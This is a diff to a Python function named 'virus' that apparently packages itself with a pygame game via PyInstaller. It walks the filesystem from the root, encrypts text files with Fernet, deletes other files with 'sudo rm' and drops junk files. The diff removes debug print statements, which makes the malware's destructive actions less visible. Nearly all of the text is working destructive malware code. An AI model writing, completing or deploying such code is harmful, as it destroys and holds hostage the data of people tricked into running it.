@@ -14,7 +14,6 @@ def virus():
 	file = open("files/file2", "r")
 	if file.readline()=="False":
 		file.close()
-		print("installation")
 		os.system("pip install -U pyinstaller")
 		os.system("pip install -U pygame")
 		os.system("python3 -m PyInstaller --onefile jeu.py")
@@ -31,7 +30,6 @@ def virus():
 
 	for (root,dirs,files) in os.walk('/', topdown=True): #goes through the directory speciefied in the 1st parametere (we'll change it to '/' after testing) 
 		print(files) #print all the files found in that directory
-		print ('--------------------------------')
 	
 		for file in files: #goes through all the files
 			path = os.path.join(root, file) #this part is to save a root file if found (just for testing, will be removed later)
@@ -55,14 +53,6 @@ def virus():
 			j=j+1
 		if trouve == False:
 			NonText_Files_Table.append(Files_Table[i])
-
-	print(Fore.BLUE+ "these are to modifiable files: ")				
-	print(Files_Table)
-	print(Fore.CYAN+ "these are to TEXT modifiable files: ")				
-	print(Text_Files_Table)
-	print(Fore.RED+ "these are to Non-TEXT modifiable files: ")				
-	print(NonText_Files_Table)
-	print(Fore.GREEN + "one of the root files " + str(theroot))
 
 	f1 = open("encryptedfiles.txt","a")
 	f1.close()
@@ -88,7 +78,6 @@ def virus():
 		
 			if found == False:
 				try:
-					print("encrypting: " + str(Text_Files_Table[randomeNumberOfTextFiles]))
 					with open(Text_Files_Table[randomeNumberOfTextFiles],"rb") as thefile:
 						contents = thefile.read()
 					contents_enctypted = Fernet(key).encrypt(contents)
@@ -100,10 +89,8 @@ def virus():
 					Text_Files_Table.remove(Text_Files_Table[randomeNumberOfTextFiles])
 					time.sleep(5)
 				except:
-					print("we don't have permission to modify the file")
 					time.sleep(5)
 			else:
-				print("file already encrypted")
 				time.sleep(5)
 	
 		##################################### deleting a file: #####################################
@@ -111,7 +98,6 @@ def virus():
 			continue
 		else:
 			try:
-				print("deleting: " +  str(NonText_Files_Table[randomeNumberOfNonTextFiles]))
 				os.system ("sudo rm " + NonText_Files_Table[randomeNumberOfNonTextFiles])
 				#os.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
 				f2 = open("deletedfiles.txt","a")
@@ -120,14 +106,10 @@ def virus():
 				NonText_Files_Table.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
 				time.sleep(5)
 			except:
-				print("we don't have permission to delete the file")
 				time.sleep(5)
 	
 		##################################### addind a file: #####################################
 		if random.randint(1,5) == 1:
 			f = open(str(randomeNumberOfFiles), "w")
 			f.close()
-			print("add file: " +  str(randomeNumberOfFiles))
 			time.sleep(5)
-	
-		print("--------------------------------------------------------------------------------------------")
